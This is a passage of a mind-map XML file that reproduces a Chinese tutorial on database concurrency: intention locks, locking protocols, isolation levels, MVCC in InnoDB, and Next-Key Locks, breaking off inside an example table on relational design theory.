    <a aria-label="Permalink: 2. 意向锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#2-意向锁">
</a>
    <p dir="auto">
      使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。
    </p>
    <p dir="auto">
      在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。
    </p>
    <p dir="auto">
      意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：
    </p>
    <ul dir="auto">
      <li>
        一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；
      </li>
      <li>
        一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。
      </li>
    </ul>
    <p dir="auto">
      通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。
    </p>
    <p dir="auto">
      各种锁的兼容关系如下：
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/080ec8f8a5084e63931890ed6e03e2dbd5d9d5dbfa94e269768ef46109519347/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231343434323638372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/080ec8f8a5084e63931890ed6e03e2dbd5d9d5dbfa94e269768ef46109519347/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231343434323638372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207214442687.png"/>
    </a><br/>
    

    <p dir="auto">
      解释如下：
    </p>
    <ul dir="auto">
      <li>
        任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁；
      </li>
      <li>
        这里兼容关系针对的是表级锁，而表级的 IX 锁和行级的 X 锁兼容，两个事务可以对两个数据行加 X 锁。（事务 T<sub>1</sub>&#xa0;想要对数据行 R<sub>1</sub>&#xa0;加 X 锁，事务 T<sub>2</sub>&#xa0;想要对同一个表的数据行 R<sub>2</sub>&#xa0;加 X 锁，两个事务都需要对该表加 IX 锁，但是 IX 锁是兼容的，并且 IX 锁与行级的 X 锁也是兼容的，因此两个事务都能加锁成功，对同一个表中的两个数据行做修改。）
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_279269520" CREATED="1754750543650" MODIFIED="1754750543650"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      封锁协议
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_783635778" CREATED="1754750543652" MODIFIED="1754750543655"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 三级封锁协议
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 三级封锁协议" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#1-三级封锁协议">
</a>
    <p dir="auto">
      <strong>一级封锁协议</strong>
    </p>
    <p dir="auto">
      事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。
    </p>
    <p dir="auto">
      可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cfa865ba2f037a48cb966eb73a19605a5569fb25f95dc8d976cbc6863af8c6f5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232303434303435312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/cfa865ba2f037a48cb966eb73a19605a5569fb25f95dc8d976cbc6863af8c6f5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232303434303435312e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207220440451.png"/>
    </a><br/>
    

    <p dir="auto">
      <strong>二级封锁协议</strong>
    </p>
    <p dir="auto">
      在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。
    </p>
    <p dir="auto">
      可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/de65fb0b4c01f14d9c2847c7e59d070c40602c5ae639b65633262c508a553f75/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232303833313834332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/de65fb0b4c01f14d9c2847c7e59d070c40602c5ae639b65633262c508a553f75/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232303833313834332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207220831843.png"/>
    </a><br/>
    

    <p dir="auto">
      <strong>三级封锁协议</strong>
    </p>
    <p dir="auto">
      在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。
    </p>
    <p dir="auto">
      可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5571753ec2db48665916c12c2a14807ffa971669c5c6e23ff07cf5ed77e3affb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313331333831392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5571753ec2db48665916c12c2a14807ffa971669c5c6e23ff07cf5ed77e3affb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313331333831392e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207221313819.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_928879862" CREATED="1754750543655" MODIFIED="1754750543658"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 两段锁协议
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 两段锁协议" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#2-两段锁协议">
</a>
    <p dir="auto">
      加锁和解锁分为两个阶段进行。
    </p>
    <p dir="auto">
      可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。串行执行的事务互不干扰，不会出现并发一致性问题。
    </p>
    <p dir="auto">
      事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。
    </p>
    <pre>lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)</pre>
    <p dir="auto">
      但不是必要条件，例如以下操作不满足两段锁协议，但它还是可串行化调度。
    </p>
    <pre>lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1770836622" CREATED="1754750543658" MODIFIED="1754750543662"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      MySQL 隐式与显式锁定
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: MySQL 隐式与显式锁定" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#mysql-隐式与显式锁定">
</a>
    <p dir="auto">
      MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。
    </p>
    <p dir="auto">
      InnoDB 也可以使用特定的语句进行显示锁定：
    </p>
    <pre>SELECT ... LOCK In SHARE MODE;
SELECT ... FOR UPDATE;</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1371087463" CREATED="1754750543662" MODIFIED="1754750543662"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、隔离级别
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_526406515" CREATED="1754750543664" MODIFIED="1754750543667"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      未提交读（READ UNCOMMITTED）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 未提交读（READ UNCOMMITTED）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#未提交读read-uncommitted">
</a>
    <p dir="auto">
      事务中的修改，即使没有提交，对其它事务也是可见的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_763368779" CREATED="1754750543667" MODIFIED="1754750543669"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      提交读（READ COMMITTED）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 提交读（READ COMMITTED）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#提交读read-committed">
</a>
    <p dir="auto">
      一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_626228431" CREATED="1754750543670" MODIFIED="1754750543671"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      可重复读（REPEATABLE READ）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 可重复读（REPEATABLE READ）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#可重复读repeatable-read">
</a>
    <p dir="auto">
      保证在同一个事务中多次读取同一数据的结果是一样的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_541354662" CREATED="1754750543672" MODIFIED="1754750543674"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      可串行化（SERIALIZABLE）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 可串行化（SERIALIZABLE）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#可串行化serializable">
</a>
    <p dir="auto">
      强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。
    </p>
    <p dir="auto">
      该隔离级别需要加锁实现，因为要使用加锁机制保证同一时间只有一个事务执行，也就是保证事务串行执行。
    </p>
    <hr/>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f38f1ad145c06f9d16524a31f4fbd00b8af93d100941b3d205a9d5a61aff1078/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232333430303738372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/f38f1ad145c06f9d16524a31f4fbd00b8af93d100941b3d205a9d5a61aff1078/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232333430303738372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207223400787.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1231357280" CREATED="1754750543674" MODIFIED="1754750543676"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、多版本并发控制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、多版本并发控制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#五多版本并发控制">
</a>
    <p dir="auto">
      多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，要求很低，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1536110412" CREATED="1754750543676" MODIFIED="1754750543678"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      基本思想
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 基本思想" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#基本思想">
</a>
    <p dir="auto">
      在封锁一节中提到，加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作，因此又引入了读写锁来避免不必要的加锁操作，例如读和读没有互斥关系。读写锁中读和写操作仍然是互斥的，而 MVCC 利用了多版本的思想，写操作更新最新的版本快照，而读操作去读旧版本快照，没有互斥关系，这一点和 CopyOnWrite 类似。
    </p>
    <p dir="auto">
      在 MVCC 中事务的修改操作（DELETE、INSERT、UPDATE）会为数据行新增一个版本快照。
    </p>
    <p dir="auto">
      脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。当然一个事务可以读取自身未提交的快照，这不算是脏读。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_491180045" CREATED="1754750543678" MODIFIED="1754750543680"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      版本号
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 版本号" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#版本号">
</a>
    <ul dir="auto">
      <li>
        系统版本号 SYS_ID：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。
      </li>
      <li>
        事务版本号 TRX_ID ：事务开始时的系统版本号。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1146411164" CREATED="1754750543680" MODIFIED="1754750543682"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Undo 日志
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Undo 日志" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#undo-日志">
</a>
    <p dir="auto">
      MVCC 的多版本指的是多个版本的快照，快照存储在 Undo 日志中，该日志通过回滚指针 ROLL_PTR 把一个数据行的所有快照连接起来。
    </p>
    <p dir="auto">
      例如在 MySQL 创建一个表 t，包含主键 id 和一个字段 x。我们先插入一个数据行，然后对该数据行执行两次更新操作。
    </p>
    <pre>INSERT INTO t(id, x) VALUES(1, &quot;a&quot;);
UPDATE t SET x=&quot;b&quot; WHERE id=1;
UPDATE t SET x=&quot;c&quot; WHERE id=1;</pre>
    <p dir="auto">
      因为没有使用 <code>START TRANSACTION</code>&#xa0;将上面的操作当成一个事务来执行，根据 MySQL 的 AUTOCOMMIT 机制，每个操作都会被当成一个事务来执行，所以上面的操作总共涉及到三个事务。快照中除了记录事务版本号 TRX_ID 和操作之外，还记录了一个 bit 的 DEL 字段，用于标记是否被删除。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e527a4dedc97064cd22941853844738cef5c31c1cddf4f645ebd4ba0a9595bf3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383136343830383231372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/e527a4dedc97064cd22941853844738cef5c31c1cddf4f645ebd4ba0a9595bf3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383136343830383231372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208164808217.png"/>
    </a><br/>
    

    <p dir="auto">
      INSERT、UPDATE、DELETE 操作会创建一个日志，并将事务版本号 TRX_ID 写入。DELETE 可以看成是一个特殊的 UPDATE，还会额外将 DEL 字段设置为 1。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_490573809" CREATED="1754750543682" MODIFIED="1754750543684"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ReadView
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ReadView" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#readview">
</a>
    <p dir="auto">
      MVCC 维护了一个 ReadView 结构，主要包含了当前系统未提交的事务列表 TRX_IDs {TRX_ID_1, TRX_ID_2, ...}，还有该列表的最小值 TRX_ID_MIN 和 TRX_ID_MAX。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5e4a4e7acab9b976b5cd1cc61bfa3835306cd206d5058ce0b58350cfe706a2f2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383137313434353637342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5e4a4e7acab9b976b5cd1cc61bfa3835306cd206d5058ce0b58350cfe706a2f2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383137313434353637342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208171445674.png"/>
    </a><br/>
    

    <p dir="auto">
      在进行 SELECT 操作时，根据数据行快照的 TRX_ID 与 TRX_ID_MIN 和 TRX_ID_MAX 之间的关系，从而判断数据行快照是否可以使用：
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          TRX_ID &lt; TRX_ID_MIN，表示该数据行快照时在当前所有未提交事务之前进行更改的，因此可以使用。
        </p>
      </li>
      <li>
        <p dir="auto">
          TRX_ID &gt; TRX_ID_MAX，表示该数据行快照是在事务启动之后被更改的，因此不可使用。
        </p>
      </li>
      <li>
        <p dir="auto">
          TRX_ID_MIN &lt;= TRX_ID &lt;= TRX_ID_MAX，需要根据隔离级别再进行判断：
        </p>
        <ul dir="auto">
          <li>
            提交读：如果 TRX_ID 在 TRX_IDs 列表中，表示该数据行快照对应的事务还未提交，则该快照不可使用。否则表示已经提交，可以使用。
          </li>
          <li>
            可重复读：都不可以使用。因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题。
          </li>
        </ul>
      </li>
    </ul>
    <p dir="auto">
      在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照，再进行上面的判断。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1291147901" CREATED="1754750543685" MODIFIED="1754750543685"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      快照读与当前读
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_228894815" CREATED="1754750543687" MODIFIED="1754750543689"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 快照读
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 快照读" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#1-快照读">
</a>
    <p dir="auto">
      MVCC 的 SELECT 操作是快照中的数据，不需要进行加锁操作。
    </p>
    <pre>SELECT * FROM table ...;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_579312279" CREATED="1754750543689" MODIFIED="1754750543691"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 当前读
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 当前读" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#2-当前读">
</a>
    <p dir="auto">
      MVCC 其它会对数据库进行修改的操作（INSERT、UPDATE、DELETE）需要进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 SELECT 的加锁操作。
    </p>
    <pre>INSERT;
UPDATE;
DELETE;</pre>
    <p dir="auto">
      在进行 SELECT 操作时，可以强制指定进行加锁操作。以下第一个语句需要加 S 锁，第二个需要加 X 锁。
    </p>
    <pre>SELECT * FROM table WHERE ? lock in share mode;
SELECT * FROM table WHERE ? for update;</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1868285570" CREATED="1754750543692" MODIFIED="1754750543694"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、Next-Key Locks
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、Next-Key Locks" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#六next-key-locks">
</a>
    <p dir="auto">
      Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。
    </p>
    <p dir="auto">
      MVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。
    </p>
  </body>
</html></richcontent>
<node ID="ID_669341490" CREATED="1754750543694" MODIFIED="1754750543696"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Record Locks
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Record Locks" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#record-locks">
</a>
    <p dir="auto">
      锁定一个记录上的索引，而不是记录本身。
    </p>
    <p dir="auto">
      如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_574054894" CREATED="1754750543696" MODIFIED="1754750543698"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Gap Locks
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Gap Locks" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#gap-locks">
</a>
    <p dir="auto">
      锁定索引之间的间隙，但是不包含索引本身。例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。
    </p>
    <pre>SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1445094496" CREATED="1754750543698" MODIFIED="1754750543700"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Next-Key Locks
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Next-Key Locks" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#next-key-locks">
</a>
    <p dir="auto">
      它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。它锁定一个前开后闭区间，例如一个索引包含以下值：10, 11, 13, and 20，那么就需要锁定以下区间：
    </p>
    <pre>(-∞, 10]
(10, 11]
(11, 13]
(13, 20]
(20, +∞)</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1047720506" CREATED="1754750543700" MODIFIED="1754750543700"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、关系数据库设计理论
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1738287317" CREATED="1754750543702" MODIFIED="1754750543704"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      函数依赖
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 函数依赖" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#函数依赖">
</a>
    <p dir="auto">
      记 A-&gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。
    </p>
    <p dir="auto">
      如果 {A1，A2，... ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。
    </p>
    <p dir="auto">
      对于 A-&gt;B，如果能找到 A 的真子集 A'，使得 A'-&gt; B，那么 A-&gt;B 就是部分函数依赖，否则就是完全函数依赖。
    </p>
    <p dir="auto">
      对于 A-&gt;B，B-&gt;C，则 A-&gt;C 是一个传递函数依赖。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_566672320" CREATED="1754750543704" MODIFIED="1754750543706"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      异常
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 异常" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#异常">
</a>
    <p dir="auto">
      以下的学生课程关系的函数依赖为 {Sno, Cname} -&gt; {Sname, Sdept, Mname, Grade}，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sno
        </th>
        <th>
          Sname
        </th>
        <th>
          Sdept
        </th>
        <th>
          Mname
        </th>
        <th>
          Cname
        </th>
        <th>
          Grade
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          学生-1
        </td>
        <td>
          学院-1
        </td>
        <td>
          院长-1
        </td>
        <td>
          课程-1
        </td>
        <td>
          90
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-2
        </td>
        <td>
          80
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-1
        </td>
        <td>
          100
        </td>
      </tr>
      <tr>
        <td>
